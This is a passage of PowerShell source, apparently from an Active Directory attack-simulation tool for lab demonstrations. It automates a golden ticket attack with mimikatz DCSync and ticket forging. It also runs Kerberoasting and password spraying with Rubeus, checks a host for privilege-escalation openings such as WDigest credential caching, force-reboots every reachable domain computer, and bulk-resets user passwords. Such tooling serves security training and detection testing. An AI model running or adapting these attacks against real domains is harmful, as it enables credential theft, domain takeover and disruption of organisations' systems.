        $sFakeUser = "FU-$sSuffix.$sPrefix".PadRight(24, [char]32)
        $sBDUser = "$global:BDUser".PadRight(24, [char]32)

        $temp = Get-KeyValue -key "LastGTUser"
        $lastGTU = $temp.PadRight(24, [char]32)

     
        Write-Host "____________________________________________________________________`n" 
        Write-Host "                 CHOOSE YOUR ACCOUNT                          "
        Write-Host "____________________________________________________________________`n" 
        Write-Host "     - the Administrator   $s500 enter:   " -NoNewline; Write-Host "A"-ForegroundColor Yellow
        Write-Host "     - the Backdoor User   $sBDUSer enter:   " -NoNewline; Write-Host "B"-ForegroundColor Yellow
        Write-Host "     - the Fake User       $sFakeUser enter:   " -NoNewline; Write-Host "F"-ForegroundColor Yellow
        Write-Host "     - the last used User  $lastGTU enter:   " -NoNewline; Write-Host "L"-ForegroundColor Yellow



        $question = "Enter your choice! Default "
        $answer = Get-Answer -question $question -defaultValue "L"

        switch ($answer) {
            "A" { $temp = $s500; Break }
            "B" { $temp = $sBDUser; Break }
            "F" { $temp = $sFakeUser; Break }
            Default { $temp = $lastGTU }
        }

        $sFakeUser = $temp.trim() 

        Write-Host $sFakeUser

        Set-KeyValue -key "LastGTUser" -NewValue $sFakeUser



        Clear-Host
        Write-Host "____________________________________________________________________`n" 
        Write-Host "         Step 1 of 3 | dump the 'krbtgt' Hash                       "
        Write-Host "____________________________________________________________________`n"     
        Write-Host
        Write-Host      -NoNewline "  Command: "
        Write-Highlight -Text ".\mimikatz.exe ", """log .\", $sFakeUser, ".log", """ ""lsadump::", "dcsync", " /domain:", $fqdn, " /user:", "krbtgt", """ ""exit"""   `
            -Color $fgcC, $fgcS, $fgcV, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcS
        
        $question = "Do you want to run this step - Y or N? Default "
        $answer = Get-Answer -question $question -defaultValue $Yes
 
        If ($answer -eq $yes) {
            Invoke-Command -ScriptBlock { .\mimikatz.exe "log .\$sFakeUser.log" "lsadump::dcsync /domain:$fqdn /user:krbtgt"  "exit" }
            Invoke-Item ".\$sFakeUser.log"
            Pause
        }


        Clear-Host
        $DomainSID = Get-KeyValue -key "DomainSID" 
        $MySearchBase = Get-KeyValue -key "MySearchBase"
        $krbtgtntml = Get-KeyValue -key "krbtgtntml"
        
        
        Do {
            Write-Host "____________________________________________________________________`n" 
            Write-Host "         Step 2 of 3 |  create the GT ticket                        "
            Write-Host "____________________________________________________________________`n"     
        
        
            $question = " -> Is this NTLH HASH '$krbtgtntml'  for 'krbtgt'  correct - Y or N? Default "
            $prompt = Get-Answer -question $question -defaultValue $yes
    
            if ($prompt -ne $yes) {
                $krbtgtntml = Read-Host "Enter new NTML Hash for 'krbtgt'"
                Set-KeyValue -key "krbtgtntml" -NewValue $krbtgtntml
            }
           
        } Until ($prompt -eq $yes)


        # example: .\mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden /domain:$fqdn /sid:$domainsID /rc4:$krbtgtntml /user:$sFakeUser /id:500 /groups:500,501,513,512,520,518,519 /ptt" "exit"

        #    $sFakeUser = "Administrator"
        Write-Host ""
        Write-Host      -NoNewline "  Command: "
        Write-Highlight -Text ".\mimikatz.exe ", """privilege::debug"" ""kerberos::purge"" ""kerberos::", "golden", " /domain:", $fqdn, " /sid:", $domainsID, " /rc4:", $krbtgtntml, " /user:", $sFakeUser, " /id:", "500", " /groups:", "500,501,513,512,520,518,519", " /ptt"" ""exit"""  `
            -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
        
       
        $question = "Do you want to run this step - Y or N? Default "
        $answer = Get-Answer -question $question -defaultValue $Yes
        
        If ($answer -eq $yes) {
            
            Invoke-Command -ScriptBlock { .\mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden /domain:$fqdn /sid:$domainsID /rc4:$krbtgtntml /user:$sFakeUser /id:500 /groups:500,501,513,512,520,518,519 /ptt" "exit" }
            #Golden ticket for 'FU-20210816.111659 @ threatprotection.corp' successfully submitted for current session
            Pause
            Clear-Host
            Write-Host "____________________________________________________________________`n" 
            Write-Host "        Displays a list of currently cached Kerberos tickets        "
            Write-Host "____________________________________________________________________`n" 
            Write-Host ""             
            Write-Host -NoNewline "  Command: "
            Write-Highlight -Text ('klist') -Color $fgcC
            Write-Host ""  
            Pause
            Set-NewColorSchema -NewStage $GoldenTicket
            klist
            Write-Host ""
            Pause
            
            
            Clear-Host
            Write-Host "____________________________________________________________________`n" 
            Write-Host "         Step 3 of 3 |  make some change for current session        "
            Write-Host "____________________________________________________________________`n"     
            Pause

            Access-Directory -directory "$env:LOGONSERVER\c$\*.*"
            Get-ADUser -filter * -SearchBase $MySearchBase | Select-Object -first 10  | Set-ADUser -replace @{info = ”Golden Ticket Attack - $sFakeUser was here” }
            get-ADUser -filter * -SearchBase $MySearchBase -Properties * | Select-Object sAMAccountName, whenChanged, Displayname, info | Select-Object -first 10 | Format-Table
            
            Write-Host ""
            Pause
        }

        Clear-Host

        Write-Host "____________________________________________________________________`n" 
        Write-Host "        ??? REPEAT | Attack Level - Golden Ticket Attack  ???           "
        Write-Host "____________________________________________________________________`n" 

        # End "Do ... Until" Loop?

        If ($UnAttended) {
            $repeat = $no
        }
        else {
            $question = "Do you need to REPEAT this attack level - Y or N? Default "
            $repeat = Get-Answer -question $question -defaultValue $no
            If ($repeat -ne $no) { Set-NewColorSchema -NewStage $InitialStart }
        }


    } Until ($repeat -eq $no)

    #####
    Write-Log -Message "### End Function $myfunction ###"
}

function New-KerberoastingAttack {

    ################################################################################
    #####                                                                      ##### 
    #####    Description                ######                                 
    #####                                                                      #####
    ################################################################################


    #Param([string] $param1, [string] $para2)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################

    Update-WindowTitle -NewTitle $stage27
    Set-KeyValue -key "LastStage" -NewValue $stage27
    #Show-Step -step "step_007.html"
    Do {

        Clear-Host
        Write-Host "____________________________________________________________________`n" 
        Write-Host "                 Attack Level -  Kerberoasting Attack               "
        Write-Host ""
        Write-Host "        AS2Go uses $RUBEUS to request a service ticket           "
        Write-Host "            for any service with a registered SPN`n"
        Write-Host "____________________________________________________________________`n" 

        Start-KerberoastingAttack    

        Clear-Host

        Write-Host "____________________________________________________________________`n" 
        Write-Host "        ??? REPEAT | Attack Level - Kerberoasting Attack  ???           "
        Write-Host "____________________________________________________________________`n" 

        # End "Do ... Until" Loop?

        If ($UnAttended) {
            $repeat = $no
        }
        else {
            $question = "Do you need to REPEAT this attack level - Y or N? Default "
            $repeat = Get-Answer -question $question -defaultValue $no
        }

        Write-Log -Message "    >> using $CAtemplate"
    } Until ($repeat -eq $no)

    Write-Log -Message "    >> using $CAtemplate"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    #
}

function New-PasswordSprayAttack {


    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #####
    $specChar = [char]0x00BB
    Write-Host "`nCurrent Default Domain Password Policy Settings:" -ForegroundColor $global:FGCHighLight
    Get-ADDefaultDomainPasswordPolicy

    $info = Get-ADDefaultDomainPasswordPolicy
    [int] $NoLT = $info.LockoutThreshold

    If ($NoLT -eq 0) {

        #The number of failed logon attempts that causes a user account to be locked out is 0;
        #this means the account will NEVER be locked out.
        Write-Host "The number of failed logon attempts that causes a user account to be locked out is " -NoNewline
        Write-Host $NoLT -ForegroundColor $fgcH -NoNewline ; Write-Host ";"
        Write-Host "this means the account will"  -NoNewline
        Write-Host " NEVER " -ForegroundColor $fgcH -NoNewline
        Write-Host "be locked out."
    }
    else {
        # The number of failed logon attempts that causes a user account to be locked out is [n];
        # this means you can run a maximum of [n-1] single 'Password Spray' Attacks.
        [int] $NoPS = $NoLT - 1
        Write-Host "The number of failed logon attempts that causes a user account to be locked out is " -NoNewline
        Write-Host $NoLT -ForegroundColor $fgcH -NoNewline; Write-Host ";"
        Write-Host "this means you can run a maximum of " -NoNewline
        Write-Host $NoPS -ForegroundColor $fgcH -NoNewline
        Write-Host " single 'Password Spray' Attacks."
    }

    Write-Host""
    
    If ($UnAttended) {
        Start-Sleep 2
    }
    else {
        pause   
    }


    $MyDomain = $env:USERDNSDOMAIN
    $MyPath = Get-KeyValue -key "MySearchBase"
    $NoU = (Get-ADUser -filter * -SearchBase $MyPath).count

    #first run with random password
    $MyPW01 = Get-RandomPassword
    #second run with valid password
    $MyPW02 = Get-KeyValue -key "LastPW"
    #third run with valid password
    $MyPW03 = Get-RandomPassword


    Do {
        
        If ($UnAttended) {
            $prompt = $yes
        }
        else {
            $question = "Do you like to use this password '$MyPW01' for the 1st spray - Y or N? Default "
            $prompt = Get-Answer -question $question -defaultValue $yes
        }

        if ($prompt -ne $yes) {
            $MyPW01 = Read-Host "Enter new password"
        }
   
    } Until ($prompt -eq $yes)


    Do {
        If ($UnAttended) {
            $prompt = $yes
        }
        else {
            $question = "Do you like to use this password '$MyPW02' for the 2nd spray - Y or N? Default "
            $prompt = Get-Answer -question $question -defaultValue $yes
        }


        if ($prompt -ne $yes) {
            $MyPW02 = Read-Host "Enter new password"
            Set-KeyValue -key "LastPW" -NewValue $MyPW02
        }
   
    } Until ($prompt -eq $yes)



    # example - First run with password zwm1FCxXi2!3+ against 2167 users from OU OU=Demo Accounts,OU=AS2Go,DC=sandbox,DC=corp       
    Write-Host "`nPW Spray #1 runs against "-NoNewline; Write-Host $NoU -NoNewline -ForegroundColor $fgcH
    Write-Host " users from OU " -NoNewline; Write-Host $MyPath -NoNewline -ForegroundColor $fgcH
    Write-Host " with password " -NoNewline; Write-host $MyPW01 -ForegroundColor $fgcH

    # example - Second run with password zwm1FCxXi2!3+ against 2167 users from OU OU=Demo Accounts,OU=AS2Go,DC=sandbox,DC=corp    
    Write-Host "PW Spray #2 runs against "-NoNewline; Write-Host $NoU -NoNewline -ForegroundColor $fgcH
    Write-Host " users from OU " -NoNewline; Write-Host $MyPath -NoNewline -ForegroundColor $fgcH
    Write-Host " with password " -NoNewline; Write-host $MyPW02 -ForegroundColor $fgcH
    Write-Host ""


    If ($UnAttended) {
        Start-Sleep 2
    }
    else {
        Pause
    }


    Start-PasswordSprayAttack -Domain $MyDomain -Password $MyPW01 -SearchBase $MyPath -NoR "1 of 2"
    Start-PasswordSprayAttack -Domain $MyDomain -Password $MyPW02 -SearchBase $MyPath -NoR "2 of 2"

  #  If ($DeveloperMode) {
        $user = $MyDomain + "\" + $env:USERNAME
        Write-Host "`n  Bingo $specChar found User: " -NoNewline; Write-Host $User -ForegroundColor $fgcH -NoNewline
        Write-Host " with Password: " -NoNewline; Write-Host $MyPW02 -ForegroundColor $fgcH
 #   }


    If ($SkipPwSpayWithRubeus -ne $true) {
        $prompt = $yes
    }
    else {
        $question = "Do you also want to run a Password Spray attack with rubues.exe - Y or N? Default "
        $prompt = Get-Answer -question $question -defaultValue $no
    }


    if ($prompt -eq $yes) {

        If ($SkipPwSpayWithRubeus -ne $true) {
            $prompt = $yes
        }
        else {
            $question = "Do you like to use this password '$MyPW03' for the spray with Rubeus - Y or N? Default "
            $prompt = Get-Answer -question $question -defaultValue $yes
        }



        if ($prompt -ne $yes) {
            $MyPW03 = Read-Host "Enter new password"
        }
        Write-Host ""
        Write-Host      -NoNewline "  Command: "
        Write-Highlight -Text " .\Rubeus.exe ", "brute /password:", $MyPW03, " /noticket" `
            -Color $fgcC, $fgcS, $fgcV, $fgcS
        Write-Host ""

        Write-Log -Message ".\Rubeus.exe brute /password:$MyPW03 /noticket"
        If ($UnAttended) { Start-Sleep 2 } else { Pause }

        Invoke-Command -ScriptBlock { .\Rubeus.exe brute /password:$MyPW03 /noticket }
    }
   


    Write-Host ""
    If ($UnAttended) { Start-Sleep 2 } else { Pause }


    #####
    Write-Log -Message "### End Function $myfunction ###"
}

function New-HoneytokenActivity {

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #####
    $honeytoken = Get-KeyValue -key "honeytoken"
    $randowmPW = Get-RandomPassword 


    Try {
        $HTSecurePass = ConvertTo-SecureString -String $randowmPW -AsPlainText -Force
        $Credential = New-Object System.Management.Automation.PSCredential $honeytoken, $HTSecurePass
        Get-ADUser -Filter * -Server $myDc -Credential $Credential
    }
    Catch {
        Write-Host "Created Honeytoken activity for $honeytoken | Attempted to login and authenticate" -ForegroundColor $global:FGCHighLight
        Write-Log -Message "Created Honeytoken activity for $honeytoken"
    }
        
    #####
    Write-Log -Message "### End Function $myfunction ###"
}

Function New-KeyValue {

    ################################################################################
    #####                                                                      ##### 
    #####         Create new value in XML File                                 #####
    #####                                                                      #####
    ################################################################################


    Param([string] $key, [string]$NewValue)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################

    [XML]$AS2GoConfig = Get-Content $configFile

    # Create a new element
    $Setting = $AS2GoConfig.CreateElement("Setting")
    $Setting.SetAttribute("Name", $key)
    $Setting.SetAttribute("Value", $NewValue)

    # Add the new element to the root element
    $root = $AS2GoConfig.SelectSingleNode("//DefaultParameter")
    $root.AppendChild($Setting)

    # Save the modified XML document
    $AS2GoConfig.Save($configFile)

    Write-Log -Message "    >> created new $key with value $($MyKey.value)"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

}

function New-PrivilegeEscalationRecommendation {

    ################################################################################
    #####                                                                      ##### 
    #####  Find the best priviledge escalation based of the current situation  #####                              
    #####                                                                      #####
    ################################################################################


    Param([string] $computer)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################

    #https://www.stigviewer.com/stig/windows_10/2017-02-21/


    [bool]$condition1 = $false
    [bool]$condition2 = $true


    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "             Choose your type of Privilege Escalation                "
    Write-Host "____________________________________________________________________`n" 


    Write-Host "     ... please be patient, while cheching your environment ... " -ForegroundColor Yellow

    $overview = Get-ComputerInformation -computer $computer
    $temp = $overview.Replace("        ", " ")
    $overview = $temp.Replace("      ", " ")
    
    $version = Get-OSVersion -computer $computer
    [int]$OSBuild = Get-OSBuild -computer $computer

    #only for testing
    #$OSBuild = 22621
    


    $le = [char]0x2264
    $ge = [char]0x2265
    $OK = [char]0x263A
    $col = [char]0x2551

    [int]$workingWinVersion = 1803
    [int]$LimitedWinVersion = 1809

    #found

    [bool]$bUseLogonCredential = $false     
    If ($OSBuild -ge 22621) {
        #means not supported
        [int]$value = -2
    }
    else {

        try {
            [int]$value = Get-ItemPropertyValue -Name UseLogonCredential -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
            If ($value -eq 1) { $bUseLogonCredential = $true }
        }
        catch {
            #means not ItemPropertyValue not available
            [int]$value = -1
        }
    }


    [bool]$result = Test-Connection -ComputerName $mySAW -Quiet -Count 1 -ErrorAction SilentlyContinue

    If ($result -eq $true) {
        try {
            [bool]$bAdminPC = Test-Path -Path "\\$mySAW\c$\temp" -ErrorAction Stop
        }
        catch {
            [bool]$bAdminPC = $false
        }

    }
    else {
        [bool]$bAdminPC = $false
    }



    [bool]$hdUser = Search-ProcessForAS2GoUsers -user  $helpdeskuser
    [bool]$daUser = Search-ProcessForAS2GoUsers -user  $domainadmin 
    [bool]$bMemberofDA = Search-ADGroupMemberShip -name "$env:COMPUTERNAME$" -rID "-512"
    [bool]$bMemberofAO = Search-ADGroupMemberShip -name "$env:COMPUTERNAME$" -rID "-548"
    [bool]$bHDMemberofPUG = Search-ADGroupMemberShip -name $helpdeskuser -rID "-525"
    [bool]$bDAMemberofPUG = Search-ADGroupMemberShip -name $domainadmin -rID "-525"
    [bool]$AdminWithSPN = Get-AdminWithSPN
    $RiskyCAtemplate = Get-RiskyEnrolledTemplates -SuppressOutPut
    $client = Get-CachedKerberosTicketsClient





<#
    Write-Host "Does the user have access to \\$mySAW\c$\temp? $bAdminPC"      
    Write-Host "Is Victim PC $env:COMPUTERNAME member of privileged group? $bMemberofDA"
    Write-Host "Is Help Desk User $helpdeskuser member of Protected Users Group? $bHDMemberofPUG"
    Write-Host "Found at least one risky CA Template? $RiskyCAtemplate"
    Write-Host "Is HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 1? $bUseLogonCredential"
    Write-Host "Does $helpdeskuser owns a process? $hdUser"
    Write-Host "Does $domainadmin owns a process? $daUser"
    Write-Host "Client for currently cached Kerberos tickets? $client"

#>


    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "             Choose your type of Privilege Escalation                "
    Write-Host "____________________________________________________________________`n" 



    $space = "  "
    Write-Host "`n     ATTACK COMPATIBILITY MATRIX:`n"

    Write-host "     current Victim PC OS:  $overview - " -NoNewline
    Write-host $version -ForegroundColor Yellow
    Write-Host
    Write-Host "$space           ║        Win 10       |        Win11 "
    Write-Host "$space           ║  $le $workingWinVersion  |  $ge $LimitedWinVersion  |   21H2   | $ge 22H2 "
    Write-Host "$space  ═════════╬══════════════════════════════════════════"
    Write-Host "$space   PtH     ║    OK    |    OK*   |    OK*   |    --    Pass-the-Hash Attack"  -ForegroundColor Yellow
    Write-Host "$space   PtT     ║    OK    |    OK    |    OK    |    OK    Pass-the-Ticket Attack"  -ForegroundColor Gray
    Write-Host "$space   PtC     ║    --    |    OK    |    OK    |    OK    Abuse misconfigured Certificate Templates "  -ForegroundColor Yellow
    Write-Host "$space   WDigest ║    OK    |    OK    |    OK    |    --    Credential Theft through Memory Access"  -ForegroundColor Gray
    Write-Host "$space   SPN     ║    OK    |    OK    |    OK    |    OK    Kerberoasting Attack"  -ForegroundColor Yellow
    Write-Host "" 
    Write-Host "   * CIFS on remote Admin PC will work, but LDAP authentication will fail."
    Write-Host "     Pass-the-Ticket attack is therefore possible!" -ForegroundColor Yellow

    Write-Host ""
    Write-Host "`n     CURRENT SITUATION - FROM THE ATTACKER'S PERSPECTIVE:`n" 
    
    Write-Host "     TOP: " -NoNewline -ForegroundColor Cyan
    Write-Host "Victim User " -NoNewline
    Write-Host "$victim " -NoNewline -ForegroundColor Yellow
    Write-Host "is member of the " -NoNewline
    Write-host "Local Admins!" -ForegroundColor Yellow

    If ($bMemberofDA) {
        Write-Host "     TOP: " -NoNewline -ForegroundColor Cyan
        Write-Host "Victim PC " -NoNewline
        Write-Host "$env:COMPUTERNAME " -NoNewline -ForegroundColor Yellow
        Write-Host "is member of the " -NoNewline
        Write-host "Domain Admins!" -ForegroundColor Yellow
    }


    If ($bMemberofAO) {
        Write-Host "     TOP: " -NoNewline -ForegroundColor Cyan
        Write-Host "Victim PC " -NoNewline
        Write-Host "$env:COMPUTERNAME " -NoNewline -ForegroundColor Yellow
        Write-Host "is member of the " -NoNewline
        Write-host "Account Operators!" -ForegroundColor Yellow
    }

    If ($client.ToUpper().contains("VI-")) {
        Write-Host "     BAD: " -NoNewline -ForegroundColor Red
        Write-Host "User for currently cached Kerberos tickets is " -NoNewline
        Write-Host "$($client.ToUpper())" -ForegroundColor Yellow
    }
    else {
        Write-Host "     TOP: " -NoNewline -ForegroundColor Cyan
        Write-Host "Client for currently cached Kerberos tickets is " -NoNewline
        Write-Host "$($client.ToUpper())" -ForegroundColor Yellow
    }
    
    If ($bAdminPC) {
        Write-Host "     TOP: " -NoNewline -ForegroundColor Cyan
        Write-Host "Your user has access to " -NoNewline
        Write-Host "\\$mySAW\c$\temp" -ForegroundColor Yellow
    }
    else {
        Write-Host "     BAD: " -NoNewline -ForegroundColor Red
        Write-Host "Your user does NOT have access to share " -NoNewline
        Write-Host "\\$mySAW\c$\temp" -ForegroundColor Yellow
    }

    [bool]$condition1 = $false

    If ($value -eq 1) {
        [bool]$condition1 = $true
        Write-Host "     TOP: " -NoNewline -ForegroundColor Cyan
        Write-host "UseLogonCredential value is set to " -NoNewline; Write-Host $value -ForegroundColor Yellow -NoNewline
        Write-Host ". WDigest will store credentials in memory!"
    }
    elseif ($value -eq 0) {
            Write-Host "      OK: " -NoNewline -ForegroundColor Yellow
        Write-host "UseLogonCredential value is set to " -NoNewline; Write-Host $value -ForegroundColor Yellow -NoNewline
        Write-Host ". WDigest will NOT store credentials in memory!"
    }
    elseif ($value -eq -1) {
        Write-Host "      OK: " -NoNewline -ForegroundColor Yellow
        Write-Host "UseLogonCredential registry item does not exist."
    }
    else {
        Write-Host "     BAD: " -NoNewline -ForegroundColor Red
        Write-Host "On this on this OS Build CREDENTIAL CACHING in the Windows authentication protocol WDigest is NOT supported."
    }


    If ($bHDMemberofPUG) {
        Write-Host "     BAD: " -NoNewline -ForegroundColor Red
        Write-host "User " -NoNewline
        Write-host "$helpdeskuser " -NoNewline -ForegroundColor Yellow
        Write-Host "is member of the " -NoNewline
        Write-Host "Protected Users Security Group!" -ForegroundColor Yellow
    }
    else {

        Write-Host "     TOP: " -NoNewline -ForegroundColor Cyan
        Write-host "User " -NoNewline
        Write-host "$helpdeskuser " -NoNewline -ForegroundColor Yellow
        Write-Host "is NOT member of the " -NoNewline
        Write-Host "Protected Users Security Group!" -ForegroundColor Yellow

        If ($hdUser -and $condition1) {
            Write-Host "     TOP: " -NoNewline -ForegroundColor Cyan
            Write-Host "Credential theft through memory access for user " -NoNewline
            Write-Host "$helpdeskuser " -NoNewline -ForegroundColor Yellow
            Write-Host "is possible!"
        }
    }


    If ($bDAMemberofPUG) {
        Write-Host "     BAD: " -NoNewline -ForegroundColor Red
        Write-host "User " -NoNewline
        Write-host "$domainadmin " -NoNewline -ForegroundColor Yellow
        Write-Host "is member of the " -NoNewline
        Write-Host "Protected Users Security Group!" -ForegroundColor Yellow
    }
    else {

        Write-Host "     TOP: " -NoNewline -ForegroundColor Cyan
        Write-host "User " -NoNewline
        Write-host "$domainadmin " -NoNewline -ForegroundColor Yellow
        Write-Host "is NOT member of the " -NoNewline
        Write-Host "Protected Users Security Group!" -ForegroundColor Yellow
   
        If ($daUser  -and $condition1) {
            Write-Host "     TOP: " -NoNewline -ForegroundColor Cyan
            Write-Host "Credential theft through memory access for user " -NoNewline
            Write-Host "$domainadmin " -NoNewline -ForegroundColor Yellow
            Write-Host "is possible!"
        }
    }

    If ($RiskyCAtemplate) {
        Write-Host "     TOP: " -NoNewline -ForegroundColor Cyan
        Write-Host "Found at least one risky CA Template, e.g. " -NoNewline
        Write-Host "$RiskyCAtemplate!" -ForegroundColor Yellow
    }

    If ($OSBuild -le 17134) {
        Write-Host "     BAD: " -NoNewline -ForegroundColor Red
        Write-Host "PtC is NOT supported on this machine!"
    }
    
     If ($OSBuild -ge 22621) {
        Write-Host "     BAD: " -NoNewline -ForegroundColor Red
        Write-Host "PtH is NOT supported on this machine!"
    }

    If ($AdminWithSPN) {
        Write-Host "     TOP: " -NoNewline -ForegroundColor Cyan
        Write-Host "Found at least one Administrator with " -NoNewline
        Write-Host "Service Principal Names (SPNs)!" -ForegroundColor Yellow
    }
    


    #    If ($overview.ToUpper().Contains("WINDOWS 11"))
    #    {
    #        Write-Host "     PtH - is NOT supported on this machine!" -ForegroundColor Red
    #        Write-Host "     PtT - is NOT supported on this machine!" -ForegroundColor Red
    #        Write-Host "     WDigest - is NOT supported on this machine!" -ForegroundColor Red
    #    }





<#
    [string]$result = $client.Trim().ToUpper()
   
    
    if ($result.StartsWith("DA-")) {

        $recommandtion = "You are already Domain Admin - nothing to do :-)"
    }
    elseif ($result.StartsWith("$env:COMPUTERNAME$".ToUpper())) {

        $recommandtion = "You are nt authority\system - nothing to do :-)"
    }
    elseif ($result.StartsWith("HD-")) {
        Write-Host "Helpdesk User"
        if ($OSBuild -le 17134) {
            Write-Host "until win 10 - 1803"
            #until win 10 - 1803
        }
        elseif (($OSBuild -ge 17763) -and ($OSBuild -lt 22000) ) {
            #<= win 10 - 22H2
            Write-Host "until win 10 - 22H2"
        }
        elseif ($OSBuild -eq 22000) {
            #win 11 - 21H2"
            Write-Host "win 11 - 21H2"
        
        }
        elseif ($OSBuild -ge 22621 ) {
            #starting with win 11 - 22H2"
            Write-Host ">= win 22H2"
        }
        else {
            Write-Host "no match"
        }
    }
    elseif ($result.StartsWith("VI-")) {
        Write-Host "Victim"
        if ($OSBuild -le 17134) {
            #until win 10 - 1803
            Write-Host "until win 10 - 1803"
        }
        elseif (($OSBuild -ge 17763) -and ($OSBuild -lt 22000) ) {
            #<= win 10 - 22H2
            Write-Host "until win 10 - 22H2"
        }
        elseif ($OSBuild -eq 22000) {
            #win 11 - 21H2"
            Write-Host "win 11 - 21H2"
        
        }
        elseif ($OSBuild -ge 22621 ) {
            #starting with win 11 - 22H2"
            Write-Host ">= win 22H2"
        }
        else {
            Write-Host "no match"
        }
    }
    
    else {
        Write-Host "no match"
    }
    



    Write-Host ""
    $recommandtion = "     Steal or Forge Authentication Certificates Attack"
    Write-Host "     RECOMMENDED ATTACK: "
    Write-Host $recommandtion -ForegroundColor Yellow
#>


    Write-Host ""

    
    Write-Log -Message "    >> Your Victim PC settings -  $overview - $version"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return "C"

}

function Restart-VictimMachines {

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #####

    Write-Host "____________________________________________________________________`n" 
    Write-Host "       TRY to reboot the following computers                         "
    Write-Host "____________________________________________________________________`n`n" 

    Get-ADComputer -Filter * -Properties LastLogonTimeStamp, lastlogonDate, operatingSystem | Where-Object { $_.LastLogonTimeStamp -gt 1000 } | format-table DNShostname, operatingSystem, Enabled, lastlogonDate -autosize
    
    $commment = "Use case $UseCase | Your network was hacked. All machines will be rebooted in $time2reboot seconds!!!!"

    write-host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "shutdown ", "/r /f /t ", "$time2reboot ", "/c ", "$commment"  `
        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV
    Write-Host  ""   

    # enumerate all enabled computer accounts 
    $computers = Get-ADComputer -Filter * -Properties LastLogonTimeStamp, lastlogonDate, operatingSystem | Where-Object { $_.LastLogonTimeStamp -gt 1000 } | Select-Object -Property Name, DNSHostName, Enabled, LastLogonDate, operatingSystem
    pause


    foreach ( $computer in $computers) {
        $remotemachine = $computer.name
        $os = $computer.operatingSystem

        # check if the computer is online
        IF (Test-Connection -BufferSize 32 -Count 1 -ComputerName $remotemachine -Quiet) {

            If ($env:COMPUTERNAME -ne $computer.name) {
                If ($os -like 'Windows 1*') {
                    # only for Windows 10 machines
                    Write-Host "Try to reboot Windows PC     - $remotemachine"
                    net use \\$remotemachine\ipc$
                    shutdown /r /f /c $commment /t $time2reboot /m \\$remotemachine
                }
                elseif ($os -like 'Windows 7*') {
                    Write-Host "Try to reboot Windows PC     - $remotemachine"
                    shutdown /r /f /c $commment /t $time2reboot /m \\$remotemachine
                }
                else {
                    Write-Host "Try to reboot Windows Server - $remotemachine"
                    shutdown /r /f /c $commment /t $time2reboot /m \\$remotemachine
                }
            }
        } #end if Test-Connection
        Else {
            Write-Warning "The remote machine $remotemachine is Down"
        } 

    } #end forach


    # last, but not least
    shutdown /r /f /c $commment /t $time2reboot /m \\$env:COMPUTERNAME

    #####
    Write-Log -Message "### End Function $myfunction ###"
}

Function Reset-AS2GoPassword {


    ################################################################################
    #####                                                                      ##### 
    #####    Reset the password from x random demo users                       ######                                 
    #####                                                                      #####
    ################################################################################
    Param([string] $Domain, [string] $NewPassword, [string] $SearchBase, [string] $NoR, [string] $Identifier)


    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    ################## main code | out- host #####################
    
    $epochseconds = $Identifier
    $SecurePass = ConvertTo-SecureString -String $NewPassword -AsPlainText -Force
    $attributes = @("name", "samaccountname", "Enabled", "passwordlastset", "whenChanged", "homePhone")
    $StartDate = (Get-Date).toString("yyyy-MM-dd HH:mm:ss")
    $ADUSers = Get-ADUser -SearchBase $searchbase -Filter 'homePhone -like $epochseconds' 

    $Step = 0
    $TotalSteps = $ADUsers.Count
  
    [bool] $StopRPw = $false

        
    Foreach ($ADUSer in $ADUsers) {
        $Step += 1
        $user = $Domain + "\" + $ADUSer.samaccountname
        $progress = [int] (($Step) / $TotalSteps * 100)
        Write-Progress -Id 0 -Activity "Resetting the password from user $User" -status "Completed $progress % of resetting passwords!" -PercentComplete $progress         
        
        Try {
            Set-ADAccountPassword -Identity $ADUSer.samaccountname -Reset -NewPassword $SecurePass -ErrorAction stop
        }
        catch {

            $StopRPw = $true
        }
       
        #If ($StopRPw  = $true) {break}
           
    }

    # close the process bar
    Start-Sleep 1
    Write-Progress -Activity "Reset the password from user $User" -Status "Ready" -Completed

    #list the affected users
    $attributes = @("name", "samaccountname", "Enabled", "passwordlastset", "whenChanged")
    Get-ADUser -SearchBase $searchbase -Filter 'homePhone -like $epochseconds' -Properties $attributes | Select-Object $attributes | Sort-Object samaccountname  | Format-Table | Out-Host
    Get-ADUser -SearchBase $searchbase -Filter 'homePhone -like $epochseconds' -Properties $attributes | Select-Object $attributes | Select-Object -First 1      | Format-Table | Out-Host

    $EndDate = (Get-Date).toString("yyyy-MM-dd HH:mm:ss")
    $duration = NEW-TIMESPAN –Start $StartDate –End $EndDate
    Write-Host "  'Game over' after just " -NoNewline; Write-Host "$duration [h]`n" -ForegroundColor $fgcH
    Write-Host ""
    If ($UnAttended) { Start-Sleep 2 } else { Pause } 


    Write-Log -Message "    >> using: $Password"
    #####
    Write-Log -Message "### End Function $myfunction ###"
}

Function Set-KeyValue {

    ################################################################################
    #####                                                                      ##### 
    #####         Update value in XML File                                     #####
    #####                                                                      #####
    ################################################################################


    Param([string] $key, [string]$NewValue)

    $myfunction = Get-FunctionName
